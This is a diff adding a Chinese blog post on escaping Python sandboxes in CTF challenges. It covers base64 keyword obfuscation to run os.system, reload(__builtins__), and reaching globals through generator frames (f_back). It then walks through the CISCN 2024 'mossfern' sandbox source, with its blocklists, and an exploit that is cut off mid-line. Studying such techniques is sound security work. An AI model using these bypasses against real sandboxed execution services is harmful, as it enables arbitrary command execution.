@@ -1,0 +1,740 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="fru1ts">
+  
+    <meta name="description" content="介绍 python的沙箱就是去模拟python的终端运行代码，为了使运行后的结果不影响当前的程序。通常是写好了一个模板（只能执行特定的功能），然后要运行时把输入的东西写入模板然后创建新的模板文件（python文件）在一个目录下运行（相当于一个沙箱），获得结果之后就把这个新的模板文件删除掉。沙箱逃逸就是为了使得能够在沙箱中通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python沙箱逃逸">
+<meta property="og:url" content="https://fru1ts.github.io/2024/05/22/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="fru1ts&#39; Blog">
+<meta property="og:description" content="介绍 python的沙箱就是去模拟python的终端运行代码，为了使运行后的结果不影响当前的程序。通常是写好了一个模板（只能执行特定的功能），然后要运行时把输入的东西写入模板然后创建新的模板文件（python文件）在一个目录下运行（相当于一个沙箱），获得结果之后就把这个新的模板文件删除掉。沙箱逃逸就是为了使得能够在沙箱中通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-22T20:27:08.000Z">
+<meta property="article:modified_time" content="2024-09-27T11:54:39.578Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>python沙箱逃逸 - fru1ts&#39; Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts&#39; Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="python沙箱逃逸"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-22 20:27" pubdate>
+          May 22, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">python沙箱逃逸</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on September 27, 2024 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2>
+<p>python的沙箱就是去模拟python的终端运行代码，为了使运行后的结果不影响当前的程序。通常是写好了一个模板（只能执行特定的功能），然后要运行时把输入的东西写入模板然后创建新的模板文件（python文件）在一个目录下运行（相当于一个沙箱），获得结果之后就把这个新的模板文件删除掉。沙箱逃逸就是为了使得能够在沙箱中通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操作。</p>
+<h2 id="方法"><a class="markdownIt-Anchor" href="#方法"></a> 方法</h2>
+<h3 id="利用元素链进行绕过"><a class="markdownIt-Anchor" href="#利用元素链进行绕过"></a> 利用元素链进行绕过</h3>
+<h4 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h4>
+<h5 id="参照ssti"><a class="markdownIt-Anchor" href="#参照ssti"></a> 参照SSTI</h5>
+<p>可以转换成SSTI用fenjing绕过</p>
+<h5 id="base64编码"><a class="markdownIt-Anchor" href="#base64编码"></a> base64编码</h5>
+<p>对关键字进行base64编码可绕过一些明文检测机制：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import base64<br>base64<span class="hljs-selector-class">.b64encode</span>(<span class="hljs-string">&#x27;__import__&#x27;</span>) #<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span><br>base64<span class="hljs-selector-class">.b64encode</span>(<span class="hljs-string">&#x27;os&#x27;</span>) #<span class="hljs-string">&#x27;b3M=&#x27;</span><br>__builtins__.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)]</span>(<span class="hljs-string">&#x27;b3M=&#x27;</span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<h5 id="reload方法"><a class="markdownIt-Anchor" href="#reload方法"></a> reload()方法</h5>
+<p>如果某个方法被题目删除了，可以通过reload重新加载</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">reload</span><span class="hljs-params">(__builtins__)</span></span><br></code></pre></td></tr></table></figure>
+<h3 id="利用栈帧沙箱逃逸"><a class="markdownIt-Anchor" href="#利用栈帧沙箱逃逸"></a> 利用栈帧沙箱逃逸</h3>
+<h4 id="生成器"><a class="markdownIt-Anchor" href="#生成器"></a> 生成器</h4>
+<p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p>
+<p>在 Python 中，生成器可以使用 yield 关键字来定义。yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
+<p>yield 使用例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    a=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">yield</span> a<br>        a+=<span class="hljs-number">1</span><br>f=f()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure>
+<h4 id="生成器表达式"><a class="markdownIt-Anchor" href="#生成器表达式"></a> 生成器表达式</h4>
+<p>很像列表，但这里是圆括号</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=(i+<span class="hljs-number">1</span> for i in range(<span class="hljs-number">100</span>)) <br></code></pre></td></tr></table></figure>
+<h4 id="栈帧frame"><a class="markdownIt-Anchor" href="#栈帧frame"></a> 栈帧(frame)</h4>
+<p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
+<p>栈帧包含了以下几个重要的属性：<br />
+<code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br />
+<code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br />
+<code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br />
+<code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br />
+<code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
+<p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/reference/datamodel.html#frame-objects">https://docs.python.org/zh-cn/3/reference/datamodel.html#frame-objects</a></p>
+<h5 id="代码对象"><a class="markdownIt-Anchor" href="#代码对象"></a> 代码对象</h5>
+<p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/reference/datamodel.html#code-objects">https://docs.python.org/zh-cn/3/reference/datamodel.html#code-objects</a></p>
+<p><code>f_code</code>既然可以获得代码对象，那就可以利用代码对象的一些属性来读一些重要的信息,比如co_consts能够获取一个包含函数中的 bytecode 所使用的字面值的 tuple，这个可以读到文件中很多的内容。</p>
+<h4 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h4>
+<p>原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表</p>
+<p>正常没在沙箱中的情况</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>        <span class="hljs-keyword">yield</span> g.gi_frame<br><br>    g = f()  <span class="hljs-comment">#生成器</span><br>    frame = <span class="hljs-built_in">next</span>(g) <span class="hljs-comment">#获取到生成器的栈帧对象</span><br>    b = frame.f_globals[<span class="hljs-string">&#x27;s3cret&#x27;</span>] <span class="hljs-comment">#返回并获取前一级栈帧的globals</span><br>    <span class="hljs-keyword">return</span> b<br><span class="hljs-built_in">print</span>(test())<br><span class="hljs-comment">#this is flag</span><br></code></pre></td></tr></table></figure>
+<p>在沙箱中运行的情况</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span><br><br>codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def waff():</span><br><span class="hljs-string">    def f():</span><br><span class="hljs-string">        yield g.gi_frame.f_back</span><br><span class="hljs-string"></span><br><span class="hljs-string">    g = f()  #生成器</span><br><span class="hljs-string">    frame = next(g) #获取到生成器的栈帧对象</span><br><span class="hljs-string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals，也可以 b = frame.f_back.f_back.f_locals[&#x27;s3cret&#x27;]</span><br><span class="hljs-string">    return b</span><br><span class="hljs-string">b=waff()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">locals</span>=&#123;&#125;<br>code = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)<br><span class="hljs-built_in">exec</span>(code,<span class="hljs-built_in">locals</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;b&quot;</span>])<br></code></pre></td></tr></table></figure>
+<p>f_back多少次得自己试了（不知道怎么算的）</p>
+<p>next函数被过滤时可以用<code>[x for x in g][0]</code>绕过</p>
+<h4 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h4>
+<h4 id="ciscn-2024-mossfern"><a class="markdownIt-Anchor" href="#ciscn-2024-mossfern"></a> CISCN 2024 mossfern</h4>
+<p>运行后沙箱的样子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">source_simple_check</span>(<span class="hljs-params">source</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Check the source with pure string in string, prevent dangerous strings</span><br><span class="hljs-string">    :param source: source code</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> exit<br>    <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">print</span><br><br>    <span class="hljs-keyword">try</span>:<br>        source.encode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeEncodeError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;non-ascii is not permitted&quot;</span>)<br>        exit()<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;__&quot;</span>, <span class="hljs-string">&quot;getattr&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>]: <span class="hljs-comment">#过滤</span><br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> source.lower():<br>            <span class="hljs-built_in">print</span>(i)<br>            exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">block_wrapper</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">audit</span>(<span class="hljs-params">event, args</span>):<br><br>        <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">str</span>, <span class="hljs-built_in">print</span><br>        <span class="hljs-keyword">import</span> os<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;marshal&quot;</span>, <span class="hljs-string">&quot;__new__&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-string">&quot;interpreter&quot;</span>, <span class="hljs-string">&quot;cpython&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;gc&quot;</span>]:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> (event + <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> args)).lower():<br>                <span class="hljs-built_in">print</span>(i)<br>                os._exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> audit<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source_opcode_checker</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Check the source in the bytecode aspect, no methods and globals should be load</span><br><span class="hljs-string">    :param code: source code</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">from</span> dis <span class="hljs-keyword">import</span> dis<br>    <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">str</span><br>    <span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br>    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> exit<br><br>    opcodeIO = StringIO()<br>    dis(code, file=opcodeIO)<br>    opcode = opcodeIO.getvalue().split(<span class="hljs-string">&quot;\n&quot;</span>)<br>    opcodeIO.close()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> opcode:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(line) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;LOAD_GLOBAL&quot;</span>, <span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, <span class="hljs-string">&quot;LOAD_METHOD&quot;</span>]):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(line) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;randint&quot;</span>, <span class="hljs-string">&quot;randrange&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;seed&quot;</span>]):<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;LOAD_GLOBAL&quot;</span>, <span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, <span class="hljs-string">&quot;LOAD_METHOD&quot;</span>] <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(line)]))<br>            exit()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">open</span><br>    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> addaudithook<br>    <span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> redirect_stdout<br>    <span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint, randrange, seed<br>    <span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br>    <span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> seed<br>    <span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>    source = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./uploads/a179049a-1596-11ef-85cf-f09e4acd3f25.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br>    source_simple_check(source)<br>    source_opcode_checker(source)<br>    code = <span class="hljs-built_in">compile</span>(source, <span class="hljs-string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>) <span class="hljs-comment">#编译</span><br>    <span class="hljs-comment"># addaudithook(block_wrapper())</span><br>    outputIO = StringIO()<br>    <span class="hljs-keyword">with</span> redirect_stdout(outputIO):<br>        seed(<span class="hljs-built_in">str</span>(time()) + <span class="hljs-string">&quot;flag111&quot;</span> + <span class="hljs-built_in">str</span>(time()))<br>        <span class="hljs-built_in">exec</span>(code, &#123;<br>            <span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>,<br>            <span class="hljs-string">&quot;randint&quot;</span>: randint,<br>            <span class="hljs-string">&quot;randrange&quot;</span>: randrange,<br>            <span class="hljs-string">&quot;seed&quot;</span>: seed,<br>            <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span><br>        &#125;, <span class="hljs-literal">None</span>)<br>    output = outputIO.getvalue()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag111&quot;</span> <span class="hljs-keyword">in</span> output:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bad code-operation why still happened ah?&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(output)<br><br></code></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waff</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>        <span class="hljs-keyword">yield</span> g.gi_frame.f_back<br>    g = f()<br>    frame = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> g][<span class="hljs-number">0</span>]<br>    runner_frame = frame.f_back.f_back.f_back<br>    <span class="hljs-built_in">str</span>=runner_frame.f_globals[<span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-string">&quot;_bui&quot;</span>+<span class="hljs-string">&quot;ltins_&quot;</span>+<span class="hljs-string">&quot;_&quot;</span>].<span 